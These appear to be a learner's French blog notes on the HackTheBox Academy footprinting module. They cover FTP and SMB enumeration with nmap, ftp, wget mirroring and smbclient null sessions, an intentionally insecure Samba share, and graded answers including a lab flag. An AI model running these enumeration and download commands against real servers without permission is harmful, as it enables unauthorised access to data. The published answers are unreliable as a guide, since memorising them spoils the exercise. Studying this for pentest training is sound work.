---
title: "HackTheBox - Footprinting Host Based Enumeration"
date: 2025-11-21 23:08:00 +0200
categories: [HackTheBox, Learning]
tags: [ftp, enumeration, network, pentesting, nmap]
description: "Découverte et énumération du protocole FTP : comprendre son fonctionnement, identifier les configurations dangereuses et exploiter les accès anonymes"
image:
  path: /assets/img/posts/footprinting-introduction.png
  alt: "Énumération et exploitation FTP"
---

## Informations sur le module

Ce cours couvre l'énumération du protocole FTP (File Transfer Protocol), un service de transfert de fichiers qui existe depuis les débuts d'Internet. J'y documente mes découvertes sur son fonctionnement, ses vulnérabilités courantes et les techniques d'énumération efficaces.

**Lien :** [Footprinting - FTP](https://academy.hackthebox.com/beta/module/112/section/1066)

## Objectifs d'apprentissage

Ce module couvre les compétences suivantes :

- Comprendre le fonctionnement du protocole FTP et ses deux canaux de communication
- Identifier les configurations dangereuses comme l'accès anonyme
- Énumérer un serveur FTP avec Nmap et ses scripts NSE
- Interagir manuellement avec un service FTP pour télécharger et uploader des fichiers

---

> Attention ceci est un cours **TIER 2** donc je n'ai pas le droit de simplement copier coller les ressources pour vous les donner donc j'en ferai un résumé de ce que je comprend à chaque fois ainsi que mon cheminement de pensée à chaque fois qu'une question s'imposera
{: .prompt-danger}

## Le protocole FTP : deux canaux, deux ports

### Comment FTP fonctionne vraiment

> **Pour les débutants** : FTP (File Transfer Protocol) est un protocole qui permet de transférer des fichiers entre un client et un serveur, un peu comme un système de partage de fichiers à distance.
{: .prompt-info}

Ce qui m'a surpris en étudiant FTP, c'est qu'il utilise **deux canaux distincts** pour communiquer, contrairement à HTTP qui n'en utilise qu'un seul.

**Le canal de contrôle (port 21) :**
- Le client envoie des commandes
- Le serveur répond avec des codes de statut
- C'est comme une ligne téléphonique où on se parle

**Le canal de données (port 20) :**
- Sert uniquement au transfert de fichiers
- Surveille les erreurs pendant la transmission
- Permet de reprendre un transfert interrompu

### FTP actif vs FTP passif

Il existe deux modes de connexion qui m'ont longtemps confus jusqu'à ce que je les teste :

**Mode actif :**
- Le client se connecte au port 21 du serveur
- Le client dit au serveur : "réponds-moi sur mon port X"
- Problème : si un firewall protège le client, le serveur ne peut pas répondre

**Mode passif :**
- Le serveur annonce un port pour le canal de données
- Le client initie les deux connexions
- Plus compatible avec les firewalls modernes

> Cette distinction est cruciale lors d'un pentest : un firewall mal configuré peut bloquer le mode actif mais laisser passer le mode passif.
{: .prompt-tip}

### FTP en clair : un risque majeur

FTP transmet **tout en clair**, y compris les identifiants. Sur un réseau où je peux capturer le trafic, je peux voir les mots de passe passer.

Il existe une variante plus sécurisée : **FTPS** (FTP over SSL/TLS), mais elle nécessite une configuration spécifique.

### TFTP : la version simplifiée

**TFTP (Trivial File Transfer Protocol)** est une version ultra-simplifiée de FTP que j'ai rencontrée sur des équipements réseau :

- Utilise **UDP** au lieu de TCP
- Pas d'authentification
- Pas de liste de répertoires
- Pas de chiffrement

> TFTP devrait être utilisé uniquement sur des réseaux locaux protégés, jamais sur Internet.
{: .prompt-danger}

Voici les commandes TFTP principales :

| Commande | Description |
|----------|-------------|
| `connect` | Définit l'hôte distant et le port |
| `get` | Télécharge un fichier |
| `put` | Envoie un fichier |
| `quit` | Quitte TFTP |
| `status` | Affiche le statut de la connexion |

### Configuration de vsFTPd : ce que j'ai appris

#### Installation et premier contact

J'ai installé vsFTPd sur ma VM pour comprendre ses options :

```bash
sudo apt install vsftpd
```

Le fichier de configuration se trouve dans `/etc/vsftpd.conf`. Voici les options que j'ai trouvées les plus importantes :

| Paramètre | Fonction | Mon usage |
|-----------|----------|-----------|
| `listen=NO` | Exécuter en tant que daemon ou via inetd | Généralement sur YES en prod |
| `anonymous_enable=NO` | Autoriser l'accès anonyme | À désactiver absolument en prod |
| `local_enable=YES` | Autoriser les utilisateurs locaux | Nécessaire pour les comptes réels |
| `write_enable=YES` | Autoriser les commandes d'écriture | Dangereux si mal configuré |

#### Le fichier /etc/ftpusers : liste noire

Ce fichier contient les utilisateurs **interdits** de connexion FTP, même s'ils existent sur le système :

```bash
cat /etc/ftpusers

guest
john
kevin
```

> C'est une mesure de sécurité pour empêcher certains comptes sensibles (comme root) de se connecter via FTP.
{: .prompt-info}

### Configurations dangereuses

#### L'accès anonyme : une faille classique

L'accès anonyme est une configuration que je trouve fréquemment sur des serveurs internes. Voici les paramètres qui l'activent :

| Paramètre | Fonction |
|-----------|----------|
| `anonymous_enable=YES` | Active le compte anonyme |
| `anon_upload_enable=YES` | L'anonyme peut uploader |
| `anon_mkdir_write_enable=YES` | L'anonyme peut créer des dossiers |
| `no_anon_password=YES` | Pas de mot de passe demandé |
| `anon_root=/home/username/ftp` | Dossier racine pour l'anonyme |

#### Ma première connexion anonyme

J'ai testé cette connexion sur un lab HTB :

```bash
ftp 10.129.14.136
```

Résultat :

```
Connected to 10.129.14.136.
220 "Welcome to the HTB Academy vsFTP service."
Name (10.129.14.136:cry0l1t3): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Ensuite, j'ai listé les fichiers disponibles :

```bash
ftp> ls

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
-rw-rw-r--    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.
```

**Mon observation :** Même sans télécharger les fichiers, cette simple liste peut révéler des informations précieuses sur l'organisation et sa structure.

#### Vérifier le statut du serveur

La commande `status` m'a donné des informations sur la configuration active :

```bash
ftp> status

Connected to 10.129.14.136.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
```

#### Mode debug : voir ce qui se passe réellement

Pour comprendre exactement ce que FTP fait, j'ai activé le mode debug :

```bash
ftp> debug
Debugging on (debug=1).

ftp> trace
Packet tracing on.

ftp> ls

---> PORT 10,10,14,4,188,195
200 PORT command successful. Consider using PASV.
---> LIST
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
[...]
226 Directory send OK.
```

> Les modes `debug` et `trace` permettent de voir les commandes FTP brutes envoyées au serveur, très utile pour comprendre le protocole.
{: .prompt-tip}

### Options de sécurité à connaître

#### Masquer les UIDs : hide_ids

Avec `hide_ids=YES`, tous les propriétaires de fichiers apparaissent comme "ftp" :

```bash
ftp> ls

-rw-rw-r--    1 ftp     ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp     ftp         4096 Sep 14 17:03 Clients
```

**Mon avis :** C'est une faible protection qui complique légèrement l'énumération mais n'empêche rien. L'attaquant ne voit plus les vrais UIDs.

#### Listing récursif : une mine d'informations

Avec `ls_recurse_enable=YES`, je peux voir toute l'arborescence en une commande :

```bash
ftp> ls -R

.:
-rw-rw-r--    1 ftp      ftp      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 ftp      ftp         4096 Sep 14 17:03 Clients

./Clients:
drwx------    2 ftp      ftp          4096 Sep 16 18:04 HackTheBox
drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:00 Inlanefreight

./Clients/HackTheBox:
-rw-r--r--    1 ftp      ftp         34872 Sep 16 18:04 appointments.xlsx
-rw-r--r--    1 ftp      ftp        498123 Sep 16 18:04 contract.docx
```

**Mon observation :** En une seule commande, je vois toute la structure. C'est dangereux pour un serveur exposé.

### Télécharger et uploader des fichiers

#### Télécharger un fichier spécifique

```bash
ftp> get Important\ Notes.txt

local: Important Notes.txt remote: Important Notes.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for Important Notes.txt (41 bytes).
226 Transfer complete.
41 bytes received in 0.00 secs (606.6525 kB/s)
```

Le fichier est maintenant sur ma machine locale.

#### Télécharger tout le contenu avec wget

Pour automatiser le téléchargement complet, j'utilise wget :

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

Résultat :

```
--2021-09-19 14:45:58--  ftp://anonymous:*password*@10.129.14.136/
           => '10.129.14.136/.listing'
Connecting to 10.129.14.136:21... connected.
Logging in as anonymous ... Logged in!
[...]
Downloaded: 15 files, 1,7K in 0,001s (3,02 MB/s)
```

wget crée un dossier avec l'IP et télécharge toute l'arborescence :

```bash
tree .

.
└── 10.129.14.136
    ├── Calendar.pptx
    ├── Clients
    │   └── Inlanefreight
    │       ├── appointments.xlsx
    │       ├── contract.docx
    │       └── meetings.txt
    └── Important Notes.txt

5 directories, 9 files
```

> Télécharger tous les fichiers d'un coup peut déclencher des alertes dans un SOC, mais c'est souvent le moyen le plus rapide d'analyser le contenu en local.
{: .prompt-warning}

#### Uploader un fichier : tester les permissions

J'ai créé un fichier de test :

```bash
touch testupload.txt
```

Puis je l'ai uploadé :

```bash
ftp> put testupload.txt

local: testupload.txt remote: testupload.txt
---> PORT 10,10,14,4,184,33
200 PORT command successful. Consider using PASV.
---> STOR testupload.txt
150 Ok to send data.
226 Transfer complete.
```

**Pourquoi c'est important :** Si je peux uploader un fichier sur un serveur FTP connecté à un serveur web, je peux potentiellement obtenir un reverse shell en uploadant un script malveillant.

### Énumération avec Nmap

#### Mettre à jour les scripts NSE

Avant de scanner, je mets à jour la base de scripts :

```bash
sudo nmap --script-updatedb

NSE: Updating rule database.
NSE: Script Database updated successfully.
```

#### Trouver les scripts FTP disponibles

```bash
find / -type f -name ftp* 2>/dev/null | grep scripts

/usr/share/nmap/scripts/ftp-syst.nse
/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse
/usr/share/nmap/scripts/ftp-bounce.nse
/usr/share/nmap/scripts/ftp-anon.nse
/usr/share/nmap/scripts/ftp-brute.nse
```

> Le script `ftp-anon.nse` est particulièrement utile pour détecter les accès anonymes.
{: .prompt-tip}

#### Scan complet du service FTP

J'ai lancé un scan avec détection de version et scripts par défaut :

```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]
| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]
|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```

**Ce que ce scan m'a révélé :**
- Accès anonyme activé
- Tous les fichiers sont en lecture/écriture
- Version du serveur : vsFTPd 3.0.3
- Je suis connecté en tant que "ftp"

#### Tracer les scripts NSE avec --script-trace

Pour voir exactement ce que Nmap fait, j'ai utilisé le mode trace :

```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace

NSOCK INFO [11.4640s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.14.136:21]
NSE: TCP 10.10.14.4:54226 > 10.129.14.136:21 | CONNECT
NSE: TCP 10.10.14.4:54228 < 10.129.14.136:21 | 220 Welcome to HTB-Academy FTP service.
```

**Mon observation :** Nmap lance quatre scans parallèles avec des timeouts différents. Le mode trace montre les ports locaux utilisés et les bannières reçues.

Documentation complète des scripts Nmap : [Nmap NSE Scripts](https://nmap.org/nsedoc/)

### Interaction manuelle avec le service

#### Avec netcat

```bash
nc -nv 10.129.14.136 21

220 Welcome to HTB-Academy FTP service.
```

#### Avec telnet

```bash
telnet 10.129.14.136 21

Trying 10.129.14.136...
Connected to 10.129.14.136.
220 Welcome to HTB-Academy FTP service.
```

#### FTP avec TLS/SSL : utiliser OpenSSL

Quand le serveur utilise FTPS, je ne peux pas utiliser un client FTP standard. J'utilise OpenSSL :

```bash
openssl s_client -connect 10.129.14.136:21 -starttls ftp

CONNECTED(00000003)
depth=0 C = US, ST = California, L = Sacramento, O = Inlanefreight, 
OU = Dev, CN = master.inlanefreight.htb, emailAddress = admin@inlanefreight.htb
verify error:num=18:self signed certificate

Certificate chain
 0 s:C = US, ST = California, L = Sacramento, O = Inlanefreight, 
   OU = Dev, CN = master.inlanefreight.htb, 
   emailAddress = admin@inlanefreight.htb
```

**Ce que le certificat révèle :**
- Nom de domaine : `master.inlanefreight.htb`
- Email admin : `admin@inlanefreight.htb`
- Organisation : Inlanefreight
- Localisation : Sacramento, California

> Les certificats SSL contiennent souvent des informations précieuses : noms de domaine, emails, localisations géographiques. À noter systématiquement lors d'un pentest.
{: .prompt-tip}

### Ce que j'ai retenu

Au cours de ce module, j'ai compris que FTP est un protocole ancien mais encore très présent, notamment dans les environnements internes. Les principales vulnérabilités proviennent de :

1. **L'accès anonyme mal configuré** qui expose des fichiers sensibles
2. **Les permissions d'écriture** qui permettent d'uploader des fichiers malveillants
3. **L'absence de chiffrement** qui rend les identifiants visibles sur le réseau
4. **Les certificats SSL** qui révèlent des informations sur l'infrastructure

---

**Which version of the FTP server is running on the target system? Submit the entire banner as the answer.**

Ok on me demande de trouver la version de FTP qui est utilisé sur le système actuellement et pour cela nous avons vu la commande `nmap` pour en premier lister les différents ports FTP:

```bash
└──╼ [★]$ sudo nmap -sC -sV -A 10.129.15.160
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-20 17:30 CST
Nmap scan report for 10.129.15.160
Host is up (0.055s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 InFreight FTP v1.1
|     Invalid command: try being more creative
|_    Invalid command: try being more creative
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3f:4c:8f:10:f1:ae:be:cd:31:24:7c:a1:4e:ab:84:6d (RSA)
|   256 7b:30:37:67:50:b9:ad:91:c0:8f:f7:02:78:3b:7c:02 (ECDSA)
|_  256 88:9e:0e:07:fe:ca:d0:5c:60:ab:cf:10:99:cd:6c:a7 (ED25519)
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39463/tcp6  mountd
|   100005  1,2,3      47411/udp6  mountd
|   100005  1,2,3      50295/udp   mountd
|   100005  1,2,3      59321/tcp   mountd
|   100021  1,3,4      34971/tcp6  nlockmgr
|   100021  1,3,4      43741/udp   nlockmgr
|   100021  1,3,4      44971/tcp   nlockmgr
|   100021  1,3,4      45616/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2049/tcp open  nfs         3-4 (RPC #100003)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=11/20%Time=691FA4BC%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,74,"220\x20InFreight\x20FTP\x20v1\.1\r\n500\x20Invalid\x20
SF:command:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20comma
SF:nd:\x20try\x20being\x20more\x20creative\r\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/20%OT=21%CT=1%CU=43835%PV=Y%DS=2%DC=T%G=Y%TM=691
OS:FA4FC%P=x86_64-pc-linux-gnu)SEQ()SEQ(SP=FF%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%
OS:TS=A)SEQ(SP=FF%GCD=2%ISR=10B%TI=Z%CI=Z%II=I%TS=1)OPS(O1=M552ST11NW7%O2=M
OS:552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN
OS:(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=N)ECN(R=Y%DF=Y%T=
OS:40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=N)T1(R=Y%DF=Y%T=40%S=O%A=O%F=AS%RD=0
OS:%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T4(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%
OS:RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%
OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)U
OS:1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)IE
OS:(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-20T23:31:39
|_  start_date: N/A
|_nbstat: NetBIOS name: DEVSMB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   55.33 ms 10.10.14.1
2   55.62 ms 10.129.15.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.88 seconds
```

Et nous pouvons voir la version de FTP mais nous avons aussi un autre possibilité pour le voir car nous voyons maintenant que le port **TCP** est sur le port `21` donc maintenant nous pouvons faire ceci:

```bash
└──╼ [★]$ nc -nv 10.129.15.160 21
(UNKNOWN) [10.129.15.160] 21 (ftp) open
220 InFreight FTP v1.1
```

Et voilà notre réponse plus clairement

**Réponse :** `InFreight FTP v1.1`

**Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.**

Bien maintenant nous devons énumérer le server FTP et trouver le flag.txt dedans. Pour arriver au résultat souhaité nous allons avoir besoin de nous connecter au server FTP en premier comme ceci

```bash
└──╼ [★]$ ftp 10.129.15.160 21
Connected to 10.129.15.160.
220 InFreight FTP v1.1
Name (10.129.15.160:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||31846|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftpuser  ftpuser        39 Nov  8  2021 flag.txt
226 Transfer complete
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||26016|)
150 Opening BINARY mode data connection for flag.txt (39 bytes)
    39       74.67 KiB/s 
226 Transfer complete
39 bytes received in 00:00 (0.68 KiB/s)
```

J'ai simplement testé voir si le serveur a un accès pour un utilisateur `anonymous` avec comme mot de passe `anonymous` et apparemment oui...

Ensuite j'ai récupéré le flag.txt avec la commande `get` pour le récupérer sur ma machine

**Réponse :** `HTB{b7skjr4c76zhsds7fzhd4k3ujg7nhdjre}`

---

## SMB (Server Message Block)

### Comprendre le protocole SMB

**SMB (Server Message Block)** est un protocole client-serveur qui régule l'accès aux fichiers, répertoires et autres ressources réseau comme les imprimantes ou routeurs.

> **Pour les débutants :** SMB permet à votre ordinateur de partager des fichiers et imprimantes sur un réseau, un peu comme un "drive partagé" en entreprise.
{: .prompt-info}

**Historique que j'ai retenu :**
- Première apparition : OS/2 avec LAN Manager
- Principal usage : Systèmes Windows (rétrocompatibilité)
- Solution Linux/Unix : **Samba** (projet open source)

**Mon observation :** La rétrocompatibilité de Windows signifie qu'un Windows 11 récent peut communiquer avec un vieux Windows XP. C'est pratique pour les entreprises, mais **dangereux pour la sécurité** car les anciennes versions ont des failles connues.

### Le fonctionnement de SMB dans les réseaux IP

**Ce que j'ai compris :** SMB utilise **TCP** pour établir la connexion via un **three-way handshake** classique avant tout échange de données.

**Mécanisme de contrôle d'accès :**
- Les serveurs SMB exposent des **shares** (partages) de leur système de fichiers local
- Les permissions sont gérées par des **ACL (Access Control Lists)**
- Les ACL sont indépendantes des permissions locales du serveur

> Important : Les droits définis sur le share SMB ne correspondent PAS forcément aux droits locaux du serveur
{: .prompt-warning}

### Samba - L'implémentation SMB pour Unix/Linux

#### CIFS vs SMB : quelle différence ?

**Ma découverte :** Samba implémente le protocole **CIFS (Common Internet File System)**, qui est en fait un **dialecte de SMB**.

> **Clarification :** CIFS = SMB version 1. C'est pour ça qu'on parle souvent de "SMB/CIFS" de manière interchangeable.
{: .prompt-info}

#### Évolution des versions SMB

**Tableau des versions que j'ai analysé :**

| Version | Système | Ports | Caractéristiques clés |
|---------|---------|-------|----------------------|
| **CIFS (SMB 1.0)** | Windows NT 4.0 | 137, 138, 139 (NetBIOS) | Communication via NetBIOS |
| **SMB 1.0** | Windows 2000 | 445 | Connexion TCP directe |
| **SMB 2.0** | Vista, Server 2008 | 445 | Performance améliorée, caching |
| **SMB 2.1** | Windows 7, Server 2008 R2 | 445 | Mécanismes de verrouillage |
| **SMB 3.0** | Windows 8, Server 2012 | 445 | Chiffrement bout-en-bout, multicanal |
| **SMB 3.1.1** | Windows 10, Server 2016 | 445 | Vérification d'intégrité, AES-128 |

**Mon analyse stratégique :** 
- **Anciennes versions (CIFS, SMB 1.0)** = vulnérables et à privilégier en pentest
- **Ports 137-139** = NetBIOS = vieilles configurations
- **Port 445** = SMB moderne = cible principale

#### Samba et Active Directory

**Ce qui m'a surpris :** Depuis la version 4, Samba peut être un **contrôleur de domaine Active Directory** complet !

**Architecture Samba :**
- **smbd** (daemon SMB) : gère les partages de fichiers et imprimantes
- **nmbd** (daemon NetBIOS) : résolution de noms NetBIOS

**Pour comprendre NetBIOS :** C'est une API développée par IBM pour que les machines s'identifient sur le réseau avec un nom plutôt qu'une IP. Le **WINS (Windows Internet Name Service)** est l'évolution moderne de NBNS.

### Configuration par défaut de Samba

#### Analyser le fichier de configuration

J'ai examiné le fichier de configuration principal de Samba :
```bash
cat /etc/samba/smb.conf | grep -v "#\|\;"
```

**Résultat obtenu :**
```
[global]
   workgroup = DEV.INFREIGHT.HTB
   server string = DEVSMB
   log file = /var/log/samba/log.%m
   max log size = 1000
   logging = file
   panic action = /usr/share/samba/panic-action %d

   server role = standalone server
   obey pam restrictions = yes
   unix password sync = yes

   passwd program = /usr/bin/passwd %u
   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .

   pam password change = yes
   map to guest = bad user
   usershare allow guests = yes

[printers]
   comment = All Printers
   browseable = no
   path = /var/spool/samba
   printable = yes
   guest ok = no
   read only = yes
   create mask = 0700

[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
```

**Mon analyse de cette configuration :**

| Paramètre | Valeur | Ce que ça signifie |
|-----------|--------|-------------------|
| `workgroup` | DEV.INFREIGHT.HTB | Nom du groupe de travail visible |
| `server string` | DEVSMB | Bannière affichée lors de la connexion |
| `server role` | standalone server | Serveur indépendant (pas dans un domaine) |
| `map to guest` | bad user | Login invalide = accès invité automatique |
| `usershare allow guests` | yes | Partages accessibles sans authentification |

> La configuration `map to guest = bad user` est **très dangereuse** : elle permet l'accès anonyme automatiquement !
{: .prompt-danger}

#### Paramètres de configuration importants

**Paramètres que j'ai identifiés comme critiques :**

| Paramètre | Description | Impact sécurité |
|-----------|-------------|-----------------|
| `[sharename]` | Nom du partage réseau | Facilite l'identification |
| `workgroup` | Groupe de travail visible | Révèle l'organisation interne |
| `path` | Répertoire partagé | Exposition de l'arborescence |
| `server string` | Bannière de connexion | Peut révéler la version |
| `usershare allow guests` | Accès invité autorisé | **Accès anonyme** |
| `map to guest` | Gestion des logins invalides | Transformation en invité |
| `browseable` | Partage visible dans la liste | Facilite la reconnaissance |
| `guest ok` | Connexion sans mot de passe | **Aucune authentification** |
| `read only` | Lecture seule | Protection contre modification |
| `create mask` | Permissions des nouveaux fichiers | Contrôle d'accès |

### Paramètres de configuration dangereux

#### Les réglages qui exposent l'entreprise

**Ma réflexion sur les risques :** Certains paramètres sont configurés "pour le confort" des employés, mais ils profitent aussi aux attaquants.

**Exemple typique :** `browseable = yes`
- **Pour l'employé** : Pratique pour voir tous les dossiers disponibles
- **Pour l'attaquant** : Carte complète de l'infrastructure accessible

#### Tableau des configurations à haut risque

| Paramètre | Valeur dangereuse | Risque |
|-----------|-------------------|---------|
| `browseable` | yes | Liste complète des partages exposée |
| `read only` | no | Modification et suppression possibles |
| `writable` | yes | Écriture autorisée = upload de malware |
| `guest ok` | yes | Aucune authentification requise |
| `enable privileges` | yes | Exploitation de privilèges SID |
| `create mask` | 0777 | Permissions complètes sur nouveaux fichiers |
| `directory mask` | 0777 | Permissions complètes sur nouveaux dossiers |
| `logon script` | script.sh | Exécution de script au login |
| `magic script` | script.sh | Exécution lors de la fermeture |
| `magic output` | script.out | Stockage de l'output du script |

> Les permissions 0777 = lecture/écriture/exécution pour TOUT LE MONDE. C'est la pire configuration possible !
{: .prompt-danger}

### Création d'un partage de test vulnérable

#### Configuration du partage [notes]

Pour comprendre l'impact, j'ai créé un partage avec **toutes les mauvaises configurations** :
```
[notes]
    comment = CheckIT
    path = /mnt/notes/

    browseable = yes
    read only = no
    writable = yes
    guest ok = yes

    enable privileges = yes
    create mask = 0777
    directory mask = 0777
```

**Mon observation :** Cette configuration est **désastreuse** mais malheureusement très courante dans les environnements de test qui restent en production.

> Conseil pentest : Chercher les partages avec "test", "dev", "temp" dans le nom - ils ont souvent ces configurations dangereuses
{: .prompt-tip}

#### Redémarrer Samba après modification

**Commande pour appliquer les changements :**
```bash
sudo systemctl restart smbd
```

### Énumération avec smbclient

#### Connexion en null session

**Ma première commande de reconnaissance :**
```bash
smbclient -N -L //10.129.14.128
```

**Options utilisées :**
- `-N` : Null session (accès anonyme sans credentials)
- `-L` : Liste les partages disponibles

**Résultat obtenu :**
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
home            Disk      INFREIGHT Samba
dev             Disk      DEVenv
notes           Disk      CheckIT
IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled -- no workgroup available
```

**Mon analyse :**
- `print$` et `IPC$` = présents par défaut dans Samba
- `home`, `dev`, `notes` = partages personnalisés potentiellement intéressants
- **5 partages exposés** sans authentification = mauvaise configuration évidente

#### Se connecter à un partage spécifique

**Ma connexion au partage [notes] :**
```bash
smbclient //10.129.14.128/notes
```

**Session obtenue :**
```
Enter WORKGROUP\<username>'s password: 
Anonymous login successful
Try "help" to get a list of possible commands.

smb: \>
```

**Ce qui m'a surpris :** Le simple appui sur "Entrée" sans mot de passe = connexion réussie en anonyme !

#### Commandes utiles dans smbclient

**Liste des fichiers disponibles :**
```bash
smb: \> ls

  .                                   D        0  Wed Sep 22 18:17:51 2021
  ..                                  D        0  Wed Sep 22 12:03:59 2021
  prep-prod.txt                       N       71  Sun Sep 19 15:45:21 2021

                30313412 blocks of size 1024. 16480084 blocks available
```

**Télécharger un fichier :**
```bash
smb: \> get prep-prod.txt

getting file \prep-prod.txt of size 71 as prep-prod.txt (8,7 KiloBytes/sec) 
(average 8,7 KiloBytes/sec)
```

**Exécuter des commandes locales sans se déconnecter :**
```bash
smb: \> !ls
prep-prod.txt

smb: \> !cat prep-prod.txt
[] check your code with the templates
[] run code-assessment.py
[] …
```

**Mon observation :** Le préfixe `!` permet d'exécuter des commandes bash locales sans quitter la session SMB. Très pratique pour analyser les fichiers téléchargés immédiatement !

### Monitoring des connexions SMB côté serveur

#### Utiliser smbstatus

**Commande administrateur :**
```bash
smbstatus
```

**Résultat obtenu :**
```
Samba version 4.11.6-Ubuntu
PID     Username     Group        Machine                                   Protocol Version  Encryption           Signing              
----------------------------------------------------------------------------------------------------------------------------------------
75691   sambauser    samba        10.10.14.4 (ipv4:10.10.14.4:45564)      SMB3_11           -                    -                    

Service      pid     Machine       Connected at                     Encryption   Signing     
---------------------------------------------------------------------------------------------
notes        75691   10.10.14.4   Do Sep 23 00:12:06 2021 CEST     -            -           

No locked files
```

**Mon analyse de ces informations :**

- **Version Samba** : 4.11.6-Ubuntu (à vérifier pour vulnérabilités connues)
- **Machine connectée** : 10.10.14.4 (mon IP d'attaquant visible !)
- **Protocole** : SMB 3.11 (version récente)
- **Chiffrement** : Aucun (données en clair)
- **Signature** : Aucune (risque de man-in-the-middle)

